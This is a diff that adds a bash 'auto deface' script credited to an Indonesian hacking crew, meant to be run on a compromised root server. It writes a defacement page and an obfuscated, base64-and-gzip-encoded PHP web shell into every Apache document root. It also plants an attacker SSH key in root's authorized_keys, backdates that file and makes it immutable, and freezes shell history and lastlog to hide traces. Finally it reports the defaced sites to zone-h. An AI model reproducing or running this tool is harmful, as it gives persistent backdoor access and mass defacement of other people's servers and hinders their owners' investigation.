@@ -1,0 +1,159 @@
+#!/bin/bash
+#Coded by d3b~X | Gantengers Crew
+#MyTeam = SultanHaikal - d3b~X - Brian Kamikaze - Vergos303 - Coupdegrace - Mdn_newbie - Index Php
+#Thanks = All Indonesian Defacer
+
+echo '<!-- Hacked By d3b~X --><html><head><title>Gantengers Crew</title><meta name="Hacked By SultanHaikal - d3b~X - Brian Kamikaze - Vergos303 - Coupdegrace - Mdn_newbie" content="Hacked By SultanHaikal - d3b~X - Index Php - Brian Kamikaze - Vergos303 - Coupdegrace - Mdn_newbie" /><meta name="publisher" content="SultanHaikal" /><link rel="icon" type="image/png" href="http://www.paper-machinery.com/flags/Indonesia.gif" /><link href="http://fonts.googleapis.com/css?family=Share+Tech+Mono" rel="stylesheet" type="text/css"><link href="http://fonts.googleapis.com/css?family=Geo" rel="stylesheet" type="text/css"></head><body><center><img src="http://2.bp.blogspot.com/-dSLwfHK0qdA/UllALg2APMI/AAAAAAAAA-8/l-No2nDh4wY/s320/sultanhaikal.JPG" width="460" height="250"></p><!-- musica inicio --><div align="center"><!-- musica fin --><p><font face="Share Tech Mono" size="4" color="red" style="color: #000; text-shadow: 0px 1px 7px #000;"><font color="red">[</font><font color="red">]</font><br><font size="7" face="Share Tech Mono" color="red">0wned by Gantengers Crew</font><br><br><hr size="3" width="90%" color="black" align="center"><font size="6" face="Share Tech Mono" color="red">Hacked By d3b~X</font><br><font size="3" face="Share Tech Mono" color="red"><font color="red">#</font> SultanHaikal - d3b~X - Brian Kamikaze - Vergos303 - Coupdegrace - Mdn_newbie - Index Php <font color="red">#</font><hr size="3" width="90%" color="black" align="center"><br><font size="5" face="Geo" style="color: #blue; text-shadow: 0px 1px 7px #000;">Team : Gantengers Crew - Indonesian h4x0r</font><br><style>#footer {background: #black;padding: 20px;}</style><div id="footer"><font size="5" face="geo" color="black">Contact<font color="red">Me</font>:<a href="https://twitter.com/d3b_x" target="_blank" style="color: black">CLICK HERE</a></div></body><font size="4" face="geo" color="black">[#]<font color="red">Greets:</font>: all Indonesia Defacer<br></html><object type="application/x-shockwave-flash" width="0" height="0" data="http://www.uploadmusic.org/musicplayer.swf?song_url=http://www.thissongissick.com/blog/wp-content/uploads/2012/05/Knife-Party-Bonfire-Original-Mix.mp3&autoplay=true"></object>' > in.txt
+
+echo '<?php function sKONe($KhLkl){ $KhLkl=gzinflate(base64_decode($KhLkl)); for($i=0;$i<strlen($KhLkl);$i++) {$KhLkl[$i] = chr(ord($KhLkl[$i])-1); } return $KhLkl; }eval(sKONe("jVLRjtMwEPyAfMXWVHIi2ktPiJdrU+6BViAhwXEcQqqqyIm3rXWJbdkOR6nKr2MnjQ5aHrBkx/Hs7I7HCxBGhOVOAZ0NxmPgr4pf3+AdGoTxeE6n0ZALy4oKeb5pZGmzWyFFvkUX0xPQnjuhpKXJNBKbeIC1dvv4jJgkBzjPpQ1uc4O6YiXGNF2NYP0ypSOgI7+c8y+l4A9dKe6Z/xfOjGH7vGY6ps6I+l8cOGJl8VJoS40D3nlFZiVKh2Y+K8Kckyu903kjWY1xckVmadEh6SmMtMYIa71vw/zz4u5hcf9lRbmia++LfRKu3MEFciiZRaByqx7pDaAxygS3lHFCbiGeJNPTw/ViNsrUwNrHyAiBGt1O8YxoZR0B9K+015iRuqmc0My4NMSPOXOMQJCekcYbyjgaAoL/8ef7AM5KCakbB13Cjaiwz9Dtrfjp968npA/swNxnJCeSbYpauK5Qd/6dVY0HHtqqntnKe/bQa/AewjD/9DE4FDh0DVkGPQMSOISQ21Jp33758v2Hxf2KBkV0vaKu1nmQQdf+4c/BDkhChtNFNbBKbL2PXXkS3JUONr5VM/IVDWeSke6e1z1YqkqZjLyYtIPM4a2SCINBuIp0bUv4WxwhNNlzpb+oy2VHXTKvjMNNDD051X46HpbQmuHbpouOx8Ige5z6TRS9mUfRbw=="));?> ' > sh.txt
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJodQ/Jxbi1tNhwvwxpvZxq8lPjlAOOq6k2yNNYA8GonNND1FoqPV+ENrFWRia5Aveial6tNc0dDiUIAzLhMm+f/Abp+4fefQQ9eurPRtWPGy3sR9y+h4EHKStmod4JLoHw7erZLEF9Kxvngm35Mpa/eS9Aq2d5NMcSQ+VD3134FlT/ngIc0lk0NUcO126A22XPDm7J71Fm52XImpfjyarSWdvSN9X6EOQZEAcSDiuzDhAJKtCJ8L4QN7es9EKt6TRgDj0Ml77rTN03yeMR0593QNY+LROn8WCFD2qIhbLwMlYIlw8q9WZ9XmLeFb9ImMk89dhEAwWJDmKnNOQyZwH " > keys.txt
+cat keys.txt > keys2.txt
+
+  if [ ! -d "/root/.ssh" ]; then
+   mkdir "/root/.ssh"
+  fi
+  if [ -f "/root/.ssh/authorized_keys" ]; then
+   cat /root/.ssh/authorized_keys >> keys.txt
+  fi
+   cat keys.txt > /root/.ssh/authorized_keys
+   touch -t 201212230438.01 /root/.ssh/authorized_keys
+   chattr +ia /root/.ssh/authorized_keys
+
+  if [ -f "/root/.ssh/authorized_keys2" ]; then
+   cat /root/.ssh/authorized_keys2 >> keys2.txt
+   cat keys2 > /root/.ssh/authorized_keys2
+   touch -t 201212230438.01 /root/.ssh/authorized_keys2
+   chattr +ia /root/.ssh/authorized_keys2
+  fi
+
+touch -t 201212230438.01 /root/.ssh
+chattr +i /root/.bash_history
+chattr +i /var/log/lastlog
+rm -rf keys.txt
+rm -rf keys2.txt
+
+echo 
+echo "                     Auto Deface for Server Rooted | Gantengers Crew"
+echo "                     ==============================================="
+echo 
+echo "[ SultanHaikal - d3b~X - Brian Kamikaze - Vergos303 - Coupdegrace - Mdn_newbie - Index Php ]"
+echo
+echo "Scan & Deface................."
+sleep 0.3
+echo
+echo "SSHD config"
+cat /etc/ssh/sshd_config | grep Port | awk '{gsub("/#/","")}1'| awk '{gsub("/Port/","")}1' > port.txt
+cat /etc/ssh/sshd_config | grep PermitRootLogin | awk '{gsub("/#/","")}1'| awk '{gsub("/PermitRootLogin/","")}1' > rootlogin.txt
+cat /etc/ssh/sshd_config | grep AllowUsers | awk '{gsub("/#/","")}1'| awk '{gsub("/AllowUsers/","")}1' > Allow.txt
+  for portx in `cat port.txt`
+   do  
+	echo " [+] Port SSH = $portx" 
+   done
+  for rootx in `cat rootlogin.txt`
+   do  
+	echo " [+] Login untuk root = $rootx" 
+   done
+  for allox in `cat Allow.txt`
+   do  
+	echo " [+] User yang diijinkan = $allox" 
+   done
+
+rm -rf port.txt
+rm -rf rootlogin.txt
+rm -rf Allow.txt	
+
+if [ -f "/etc/httpd/conf/httpd.conf" ];
+then 
+   CONF="/etc/httpd/conf/httpd.conf"
+  elif [ -f "/etc/apache/conf/httpd.conf" ];then 
+       CONF="/etc/apache/conf/httpd.conf"
+  elif [ -f "/usr/local/apache/conf/httpd.conf" ];then 
+       CONF="/usr/local/apache/conf/httpd.conf"
+  elif [ -f "/usr/local/httpd/conf/httpd.conf" ];then 
+       CONF="/usr/local/httpd/conf/httpd.conf"
+  elif [ -f "/usr/apache/conf/httpd.conf" ];then 
+       CONF="/usr/apache/conf/httpd.conf"
+  elif [ -f "/usr/httpd/conf/httpd.conf" ];then 
+       CONF="/usr/httpd/conf/httpd.conf"
+  else
+  echo "[1] httpd.conf tidak ditemukan -_-"
+  exit	
+fi
+
+	cat $CONF | grep ServerName | awk '{gsub("ServerName","")}1' | awk '{gsub("#","")}1' | sed -e "s/\s\+//g" > domx.txt
+	cat $CONF | grep ServerAlias | awk '{gsub("ServerAlias","")}1' | awk '{gsub("#","")}1' | sed '/www./s///g' >> domx.txt
+	cat $CONF | grep DocumentRoot | awk '{gsub("DocumentRoot","")}1' | awk '{gsub("#","")}1' | sed -e "s/\s\+//g" > dirx.txt
+	cat domx.txt | sed -e "s/\s\+/\n/g" | awk '{gsub("www.","")}1' | sort | uniq > dom.txt
+	cat dirx.txt | sort | uniq > dir.txt 
+
+for domain in `cat dom.txt`  
+   do  
+	echo "http://$domain/ganteng.htm" >> url_.txt
+	echo "http://$domain/pots.php" >> shell_.txt
+   done
+cat url_.txt | sort | uniq > url.txt
+cat shell_.txt | sort | uniq > x.txt
+
+echo "#!/bin/sh" > bersih.sh
+for dirnya in `cat dir.txt`
+  do
+	cat in.txt > "$dirnya/ganteng.htm"
+	cat sh.txt > "$dirnya/pots.php"
+	echo $dirnya > woot.txt
+	echo "rm $dirnya/ganteng.htm" >> bersih.sh 
+	cat woot.txt | awk '{gsub("/home/","")}1' | cut -d '/' -f 1 > user.txt
+	for usernya in `cat user.txt`
+	do
+	   chown $usernya:$usernya "$dirnya/ganteng.htm" >> /dev/null
+	   chown $usernya:$usernya "$dirnya/pots.php" >> /dev/null
+	done
+  done	
+
+chmod +x bersih.sh
+echo 
+echo " [+] Selesai masbro :D"
+echo " [+] All web di file url.txt"
+echo " [+] All shell di file x.txt"
+echo
+echo
+echo "========================================================================"
+echo "+++++++++++ GANTENGER'S CREW  || INDONESIAN DEFACER  +++++++++++++++++++"
+echo "========================================================================"
+echo 
+echo "+++++++++++++ Sekarang Waktunya Submit ke Zone-H +++++++++++++++++++++++"
+echo
+rm -rf woot.txt 
+rm -rf domx.txt
+rm -rf user.txt
+rm -rf dom.txt
+rm -rf in.txt
+rm -rf sh.txt
+rm -rf url_.txt
+rm -rf dirx.txt
+rm -rf dir.txt
+rm -rf shell_.txt
+sleep 2
+
+for urlnya in `cat url.txt`
+    do
+        curl --silent $urlnya | grep "Hacked" >> /dev/null;check=$?
+        if [ $check -eq 0 ]
+        then
+	  zoneh="http://www.zone-h.org/notify/single"
+	  echo "[!] $urlnya defaced"
+	  echo "$urlnya" > xx_.txt
+	  echo "$urlnya" >> defaced.txt
+          cat xx_.txt | awk '{gsub("ganteng.htm","pots.php")}1' > shell__.txt
+	  for shellx in `cat shell__.txt`
+	    do
+	    echo "[!] Shell = $shellx"
+	     echo "$shellx" >> xx.txt
+	    done
+	  curl --user-agent "Mozilla/5.0" --silent --data "defacer=d3b~X&domain1=http://wiiconsoledeals.tvui.com/ganteng.htm&hackmode=15&reason=1" http://www.zone-h.org/notify/single &
+	  sleep 2
+	fi
+    done
+
+rm -rf shell__.txt
+rm -rf xx_.txt
